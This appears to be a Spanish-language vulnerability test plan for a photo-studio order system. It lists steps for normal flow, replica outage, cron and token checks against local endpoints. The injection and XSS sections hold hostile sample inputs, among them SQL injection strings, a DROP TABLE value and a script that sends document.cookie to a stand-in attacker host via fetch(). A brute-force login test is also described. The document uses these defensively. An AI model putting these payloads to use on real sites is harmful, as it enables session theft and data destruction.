# Pruebas de Vulnerabilidades - Fotografías Campos

## 1. HAPPY PATH
Flujo normal completo del sistema.

### Pasos:
1. POST http://localhost:5000/api/auth/register
2. POST http://localhost:5000/api/auth/login → guardar token
3. POST http://localhost:5000/api/pedidos (con token)
4. POST http://localhost:3001/auth/login → guardar token API2
5. PUT http://localhost:3001/pedidos/{id}/estado (estado: listo_para_recogida)
6. Verificar que llegó el correo
7. GET http://localhost:5001/query/pedidos (con token) → ver datos en réplica

---

## 2. RÉPLICA DETENIDA
### Pasos:
1. Detener réplica: docker stop db_replica
2. Crear un pedido nuevo en API 1
3. GET http://localhost:5001/query/pedidos → debe fallar o mostrar datos viejos
4. Encender réplica: docker start db_replica
5. Esperar 10 segundos
6. GET http://localhost:5001/query/pedidos → ahora debe mostrar el pedido nuevo

---

## 3. SEGUNDO PLANO (CRON)
### Pasos:
1. Cambiar estado de pedido a "listo_para_recogida" en API 2
2. Esperar 30 minutos o ejecutar manualmente
3. GET http://localhost:3001/cron/estado → verificar que cron está activo
4. Verificar correo recibido en el email del cliente

---

## 4. INYECCIÓN DE DATOS (SQL Injection)
### Evidencia de ataque y protección:

**Intento de ataque:**
POST http://localhost:5000/api/pedidos
Body:
{
  "nombreCliente": "' OR '1'='1",
  "telefono": "1234567890",
  "tipoServicio": "DROP TABLE Pedidos",
  "fechaEntrega": "2026-06-15T10:00:00",
  "cantidadFotos": 5,
  "precio": 100
}

**Resultado esperado:** 400 Bad Request
**El sistema responde:** "Se detectó contenido no permitido en la petición"
**Log generado:** [SEGURIDAD] Intento de SQL Injection bloqueado desde IP: x.x.x.x

---

## 5. SIMULACIÓN DE FACTURAS (XSS)
### Evidencia de ataque y protección:

**Intento de ataque:**
POST http://localhost:5000/api/pedidos
Body:
{
  "nombreCliente": "<script>fetch('http://atacante.com?cookie='+document.cookie)</script>",
  "telefono": "1234567890",
  "tipoServicio": "<iframe src='javascript:alert(1)'>",
  "fechaEntrega": "2026-06-15T10:00:00",
  "cantidadFotos": 5,
  "precio": 100
}

**Resultado esperado:** 400 Bad Request
**El sistema responde:** "Se detectó contenido no permitido"

---

## 6. SUPLANTACIÓN DE CREDENCIALES (Clonación de sesión)
### Pasos:
1. Login normal → obtener token válido
2. Intentar usar el mismo token desde otra IP/sesión
3. Intentar login con credenciales incorrectas 20+ veces

**Intento de fuerza bruta:**
POST http://localhost:5000/api/auth/login (repetir 25 veces)
Body: { "username": "admin", "password": "intentos_falsos" }

**Resultado esperado:** 429 Too Many Requests
**El sistema responde:** "Demasiados intentos de login. Espera 1 minuto."

---

## 7. CONSULTAS POR TOKEN (Sesión activa obligatoria)
### Evidencia:

**Sin token:**
GET http://localhost:5000/api/pedidos
**Resultado:** 401 Unauthorized

**Con token expirado:**
GET http://localhost:5000/api/pedidos
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.expired.token
**Resultado:** 401 Unauthorized

**Con token válido:**
GET http://localhost:5000/api/pedidos
Authorization: Bearer {token_valido}
**Resultado:** 200 OK

---

## PUNTOS EXTRAS - Control de vulneraciones

Para ver en qué API, servicio y acceso ocurrió cada ataque,
revisar los logs de cada contenedor:

docker logs api1 --tail 50
docker logs api2 --tail 50
docker logs api3 --tail 50

Cada intento de ataque genera un log con:
- IP del atacante
- Tipo de ataque detectado
- Endpoint atacado
- Timestamp del intento 
